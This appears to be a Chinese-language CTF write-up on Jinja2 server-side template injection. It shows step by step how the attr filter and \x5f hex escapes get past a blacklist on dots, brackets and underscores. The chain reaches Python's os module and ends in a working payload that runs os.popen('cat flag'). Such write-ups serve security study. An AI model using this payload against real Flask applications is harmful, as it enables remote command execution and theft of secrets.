## attr 过滤器模板注入攻击

我发现 Python 的属性访问（点符号 ( `.`)、下标语法 ( `[]`)、`getattr` 等等）和下划线都被列入了黑名单

通过分析 Jinja2 的过滤器，发现可以使用 `attr` 过滤器来访问对象属性，而无需使用 `.`

Python 字符串可以通过字节表示来绕过字符过滤，例如使用 `\x5f` 代替 `_`

使用 `attr()` 调用构建了一个链

```jinja2
{{config|attr('__class__')}}
```

`{{config|attr('__class__')}}` 会输出 config 对象的类型，即 flask.config.Config 类

**1️⃣ `config`**

`config` 是 **Flask 应用的配置对象**

它通常存储：

- `SECRET_KEY`
- 数据库连接字符串
- 调试模式开关
- 其他应用配置

**2️⃣ `|attr('__class__')`**

Jinja2 的 `attr` 过滤器允许访问对象的属性，相当于 Python 里的 `getattr(obj, attr_name)`

```jinja2
config|attr('__class__') == getattr(config, "__class__")
```

十六进制编码

```jinja2
{{config|attr('\x5f\x5fclass\x5f\x5f')}}
```

拿到 OS 模块

```jinja2
{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')}}
```

**1️⃣ `config`**

这是 Flask 应用中的配置对象（`flask.config.Config` 实例）。
 它继承自 Python 字典，存放应用配置。

------

**2️⃣ `|attr('\x5f\x5fclass\x5f\x5f')`**

这里的 `\x5f` 是下划线 `_` 的十六进制表示

- `\x5f\x5fclass\x5f\x5f` = `__class__`
- 所以这一步相当于 `config.__class__`，即得到类对象 `<class 'flask.config.Config'>`

------

**3️⃣ `|attr('\x5f\x5finit\x5f\x5f')`**

- 访问 `Config` 类的 `__init__` 方法（构造函数）
- 在 Python 里，方法本质上是 **函数对象**

------

**4️⃣ `|attr('\x5f\x5fglobals\x5f\x5f')`**

- 每个函数对象都有 `__globals__` 属性 → 它是一个字典，表示这个函数定义时的全局命名空间
- 也就是说，这里我们拿到了 `Config.__init__` 的全局变量字典

里面通常包含：

- `__builtins__`
- `os`
- `sys`
- 其他 Flask / Python 全局对象

------

**5️⃣ `|attr('\x5f\x5fgetitem\x5f\x5f')('os')`**

- `__getitem__` 是 Python 容器类型（比如字典）的取值方法，相当于 `dict['key']`

- 这里调用 `__getitem__('os')`，相当于：

  ```jinja2
  config.__class__.__init__.__globals__['os']
  ```

最后，我执行了读取标志的命令

```jinja2
{{ config | attr('\x5f\x5fclass\x5f\x5f') | attr('\x5f\x5finit\x5f\x5f') | attr('\x5f\x5fglobals\x5f\x5f') | attr('\x5f\x5fgetitem\x5f\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}
```
